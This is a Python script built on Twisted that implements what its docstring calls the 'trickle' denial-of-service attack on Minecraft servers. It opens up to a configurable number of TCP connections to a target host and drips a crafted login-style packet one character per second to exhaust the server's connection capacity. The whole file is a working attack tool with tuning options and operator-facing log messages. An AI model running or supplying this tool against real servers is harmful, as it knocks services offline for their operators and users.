#!/usr/bin/env python

from optparse import OptionParser
import random
import string
from struct import pack
import sys

usage = """usage: %prog [options] host

I am quite noisy by default; consider redirecting or filtering my output."""

parser = OptionParser(usage)
parser.add_option("-c", "--count",
    dest="count",
    type="int",
    default=2,
    metavar="COUNT",
    help="Number of connections per interval",
)
parser.add_option("-m", "--max",
    dest="max",
    type="int",
    default=1000,
    metavar="COUNT",
    help="Maximum number of connections to spawn",
)
parser.add_option("-i", "--interval",
    dest="interval",
    type="float",
    default=0.02,
    metavar="INTERVAL",
    help="Time to wait between connections",
)
parser.add_option("-p", "--port",
    dest="port",
    type="int",
    default=25565,
    metavar="PORT",
    help="Port to use",
)
options, arguments = parser.parse_args()
if len(arguments) != 1:
    parser.error("Need exactly one argument")

# Use poll(). To use another reactor, just change these lines.
# OSX users probably want to pick another reactor. (Or maybe another OS!)
# Linux users should definitely do epoll().
from twisted.internet import pollreactor
pollreactor.install()

from twisted.internet import reactor
from twisted.internet.error import (ConnectBindError, ConnectionRefusedError,
    DNSLookupError, TimeoutError)
from twisted.internet.protocol import Factory, Protocol
from twisted.internet.endpoints import TCP4ClientEndpoint
from twisted.internet.task import LoopingCall
from twisted.python import log

log.startLogging(sys.stdout)

class TrickleProtocol(Protocol):
    """
    Implementation of the "trickle" DoS attack on MC servers.
    """

    def __init__(self):
        """
        Prepare our payload.
        """

        length = random.randint(18, 20)
        self.payload = "\x02\x33%s%s%s%s" % (
            pack(">H", length),
            "".join(random.choice(string.printable) for i in range(length)),
            pack(">H", length),
            "".join(random.choice(string.printable) for i in range(length)),
        )
        self.index = 0

    def connectionMade(self):
        """
        Send our payload at an excrutiatingly slow pace.
        """

        self.factory.pending -= 1
        self.factory.connections += 1

        self.sendchar()
        self.loop = LoopingCall(self.sendchar)
        self.loop.start(1)

    def sendchar(self):
        """
        Send a single character down the pipe.
        """

        self.transport.write(self.payload[self.index])
        self.index += 1
        if self.index >= len(self.payload):
            # Just stop and wait to get reaped.
            self.loop.stop()

    def connectionLost(self, reason):
        """
        Remove ourselves from the factory.
        """

        self.factory.connections -= 1

class TrickleFactory(Factory):
    """
    Factory for maintaining a certain number of open connections.
    """

    protocol = TrickleProtocol

    connections = 0
    pending = 0

    def __init__(self):
        self.endpoint = TCP4ClientEndpoint(reactor, arguments[0], options.port,
            timeout=2)

        log.msg("Using host %s, port %d" % (arguments[0], options.port))

        LoopingCall(self.log_status).start(1)
        LoopingCall(self.spawn_connection).start(options.interval)

    def spawn_connection(self):
        for i in range(options.count):
            if self.connections + self.pending >= options.max:
                return

            d = self.endpoint.connect(self)
            self.pending += 1

            def eb(failure):
                self.pending -= 1
                if failure.check(TimeoutError):
                    pass
                elif failure.check(ConnectBindError):
                    warn_ulimit()
                elif failure.check(ConnectionRefusedError):
                    exit_refused()
                elif failure.check(DNSLookupError):
                    warn_dns()
                else:
                    log.msg(failure)
            d.addErrback(eb)

    def log_status(self):
        log.msg("%d active connections, %d pending connections" %
            (self.connections, self.pending))

def warn_ulimit(called=[False]):
    if not called[0]:
        log.msg("Couldn't bind to get an open connection.")
        log.msg("Consider raising your ulimit for open files.")
    called[0] = True

def warn_dns(called=[False]):
    if not called[0]:
        log.msg("Couldn't do a DNS lookup.")
        log.msg("Either your ulimit for open files is too low...")
        log.msg("...or your target isn't resolvable.")
    called[0] = True

def exit_refused(called=[False]):
    if not called[0]:
        log.msg("Your target is not picking up the phone.")
        log.msg("Connection refused; quitting.")
        reactor.stop()
    called[0] = True

log.msg("Trickling against %s" % arguments[0])
log.msg("Running with up to %d connections" % options.max)
log.msg("Time interval: %fs, %d conns (%d conns/s)" %
    (options.interval, options.count, options.count * int(1 / options.interval)))
factory = TrickleFactory()
reactor.run()
